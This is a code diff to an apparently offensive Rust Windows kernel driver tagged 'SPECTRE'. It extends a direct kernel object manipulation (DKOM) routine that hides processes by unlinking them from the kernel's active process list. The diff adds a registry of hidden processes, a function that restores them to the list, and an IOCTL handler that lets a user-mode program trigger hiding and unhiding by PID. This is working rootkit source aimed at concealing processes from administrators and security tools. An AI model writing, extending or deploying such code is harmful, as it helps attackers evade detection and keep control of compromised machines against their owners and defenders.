@@ -116,6 +116,16 @@ struct LdrDataTableEntry {
 // ============================================================
 static mut AV_CALLBACK_REGISTERED: bool = false;
 
+// Registry of hidden processes so DKOM can be reversed (unhide).
+// We store the PID plus the ORIGINAL flink/blink pointers captured
+// BEFORE unlinking, so dkom_unhide_process() can restore the list.
+const MAX_HIDDEN: usize = 64;
+static mut HIDDEN_PIDS: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN];
+static mut HIDDEN_LINKS: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN]; // links_ptr
+static mut HIDDEN_FLINK: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN]; // original flink
+static mut HIDDEN_BLINK: [usize; MAX_HIDDEN] = [0; MAX_HIDDEN]; // original blink
+static mut HIDDEN_COUNT: usize = 0;
+
 // ============================================================
 // UNICODE_STRING Helper
 // ============================================================
@@ -197,6 +207,19 @@ unsafe fn dkom_hide_process(pid: HANDLE) -> bool {
         return false;
     }
 
+    // Save the ORIGINAL links before unlinking so unhide can restore them.
+    if HIDDEN_COUNT >= MAX_HIDDEN {
+        ObfDereferenceObject(eprocess);
+        DbgPrint(b"[SPECTRE] DKOM: hidden registry full!\n\0".as_ptr() as *const c_char);
+        return false;
+    }
+    HIDDEN_PIDS[HIDDEN_COUNT] = pid as usize;
+    HIDDEN_LINKS[HIDDEN_COUNT] = links_ptr as usize;
+    HIDDEN_FLINK[HIDDEN_COUNT] = flink as usize;
+    HIDDEN_BLINK[HIDDEN_COUNT] = blink as usize;
+    HIDDEN_COUNT += 1;
+
+    // Unlink: bridge neighbors, then self-loop the removed entry.
     (*flink).blink = blink;
     (*blink).flink = flink;
     (*links_ptr).flink = links_ptr;
@@ -205,6 +228,43 @@ unsafe fn dkom_hide_process(pid: HANDLE) -> bool {
     ObfDereferenceObject(eprocess);
     DbgPrint(b"[SPECTRE] DKOM: Process hidden (PID: %p)\n\0".as_ptr() as *const c_char, pid);
     true
+}
+
+// ============================================================
+// DKOM: Un-Hide Process (restore ActiveProcessLinks entry)
+// ============================================================
+unsafe fn dkom_unhide_process(pid: HANDLE) -> bool {
+    for i in 0..HIDDEN_COUNT {
+        if HIDDEN_PIDS[i] == pid as usize {
+            let links_ptr = HIDDEN_LINKS[i] as *mut ListEntry;
+            let flink = HIDDEN_FLINK[i] as *mut ListEntry;
+            let blink = HIDDEN_BLINK[i] as *mut ListEntry;
+
+            // Only restore if the entry is currently self-looped (still hidden).
+            if !links_ptr.is_null() && !flink.is_null() && !blink.is_null()
+                && (*links_ptr).flink == links_ptr && (*links_ptr).blink == links_ptr
+            {
+                (*links_ptr).flink = flink;
+                (*links_ptr).blink = blink;
+                (*flink).blink = links_ptr;
+                (*blink).flink = links_ptr;
+            }
+
+            // Remove this entry from the registry (shift the rest down).
+            for j in i..HIDDEN_COUNT - 1 {
+                HIDDEN_PIDS[j] = HIDDEN_PIDS[j + 1];
+                HIDDEN_LINKS[j] = HIDDEN_LINKS[j + 1];
+                HIDDEN_FLINK[j] = HIDDEN_FLINK[j + 1];
+                HIDDEN_BLINK[j] = HIDDEN_BLINK[j + 1];
+            }
+            HIDDEN_COUNT -= 1;
+
+            DbgPrint(b"[SPECTRE] DKOM: Process unhidden (PID: %p)\n\0".as_ptr() as *const c_char, pid);
+            return true;
+        }
+    }
+    DbgPrint(b"[SPECTRE] DKOM: PID %p not found in hidden registry\n\0".as_ptr() as *const c_char, pid);
+    false
 }
 
 // ============================================================
@@ -371,6 +431,23 @@ unsafe extern "system" fn device_control_handler(
             if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
                 let pid = *input_buffer as HANDLE;
                 if dkom_hide_process(pid) {
+                    information = 1;
+                } else {
+                    status = 0xC0000001;
+                }
+            } else {
+                status = 0xC000000D;
+            }
+        }
+
+        // --- Un-Hide Process by PID (restore ActiveProcessLinks) ---
+        IOCTL_UNHIDE_PROCESS => {
+            let input_buffer = (*irp).AssociatedIrp.SystemBuffer as *mut u64;
+            let input_length = (*irp_stack).Parameters.DeviceIoControl.InputBufferLength;
+
+            if !input_buffer.is_null() && input_length >= core::mem::size_of::<u64>() as u32 {
+                let pid = *input_buffer as HANDLE;
+                if dkom_unhide_process(pid) {
                     information = 1;
                 } else {
                     status = 0xC0000001;
